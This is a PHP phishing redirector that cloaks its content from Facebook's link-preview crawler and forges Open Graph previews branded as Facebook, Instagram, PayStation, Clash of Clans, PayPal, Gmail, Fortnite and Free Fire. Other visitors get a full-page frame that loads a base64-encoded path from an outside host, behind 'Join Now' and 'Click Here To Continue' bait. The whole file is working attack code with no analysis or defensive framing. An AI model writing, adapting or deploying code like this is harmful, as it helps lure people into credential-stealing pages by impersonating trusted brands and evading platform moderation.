<?php
error_reporting(0);
$zebii = trim($_GET['sam']);
$lax= trim($_GET['i']);
$Path = "https://dev-tona2021.pantheonsite.io/img/pro/en/";
$actual_link = "https://" . $_SERVER[ HTTP_HOST ] . $_SERVER[ REQUEST_URI ];
$ua = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/facebook/si',$ua)) { 
header('Location:https://web.facebook.com/'); 
die(); }else{
$zebiii = substr($zebii , strpos($zebii , '//'), 5000000 );
        $find1 = strpos( $actual_link, "RmJ");
	$find2 = strpos( $actual_link, "cHlw");
	$find3 = strpos( $actual_link, "gmail");
	$find4 = strpos( $actual_link, "bmV0Zmx");
	$find5 = strpos( $actual_link, "snap");
	$find6 = strpos( $actual_link, "pubg");
	$find7 = strpos( $actual_link, "fortnite");
	$find8 = strpos( $actual_link, "freefire");

	echo '

 ';
if ( $find1 || $find2 || $find3 || $find4 || $find5 || $find6 || $find7 || $find8 ) {
		echo '
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>';
	}
	if ( strpos($actual_link, 'Fbm') !== false ) {
		echo '
<title></title>
<meta property="og:url" content="https://www.facebook.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://www.facebook.com" />
';
	} elseif( strpos($actual_link, 'instagram') !== false ) {
		echo '
<title></title>
<meta property="og:url" content="http://www.instagram.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png" />
';
	}elseif( strpos( $actual_link, 'psn' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://store.playstation.com/en-us/home/games" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="http://id.sonyentertainmentnetwork.com/signin/d2216062b952c3b6ac066e8d2b424cac5cb60fc2/assets/icons/appleicon-ca5d0c8e114a35dbced1023091a3f292.png" />
';
	}elseif( strpos( $actual_link, 'clasha' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="http://clashofclans.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://clashofclans.com/blog-assets/favicon/apple-touch-icon-120x120.png" />
';
	}elseif( strpos( $actual_link, 'clash' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="http://clashofclans.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://clashofclans.com/blog-assets/favicon/apple-touch-icon-120x120.png" />
';
	}elseif( strpos( $actual_link, 'Paypal.com' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.paypal.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://www.paypal.com" />
';
	}elseif( strpos( $actual_link, 'clashroy' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="http://clashroyale.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://clashroyale.com/blog-assets/favicon/apple-icon-120x120.png" />
';
	}elseif( strpos( $actual_link, 'gmail' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="http://gmail.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/New_Logo_Gmail.svg/1280px-New_Logo_Gmail.svg.png" />
';
	}elseif( strpos( $actual_link, 'fortnite' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.epicgames.com/fortnite/en-US/home" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="https://static-assets-prod.epicgames.com/fortnite/static/favicon.ico" />
';
	}elseif( strpos( $actual_link, 'freefire' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://ff.garena.com/index.html" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Contintue" />
<meta property="og:image" content="http://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" />
';
	}else{
		echo'
		';
	}
echo '
<html>
<head>
<title>Hello - Welcome! Please log in to continue... </title>
<meta property="og:url" content="https://apps.facebook.com" />
<meta property="og:type" content="article" />
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
    <meta name="viewport" content="width=device-width" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click me! " />
<meta property="og:image" content="https://kiflite.bg/inc" />
<meta name="revisit-after" content="1000 days">
<meta name="robots" content="NOINDEX">
</head>
<title>zabi </title>
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="revisit-after" content="500000 days">
<meta name="robots" content="NOINDEX">
<link rel="shortcut icon" type="image/ico" href="">

</head>';


echo '
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<frameset rows="*,4" frameborder="NO" border="50" framespacing="0">
<frame name="main" src="'.$Path.base64_decode($zebiii.$lax).'">
<noframes>
<body bgcolor="#FFFFFF" text="#000000">
<a href="'.$Path.base64_decode($zebiii.$lax).'">Click here to continue</a>
</body>
</noframes>
</html>
';
} 
?>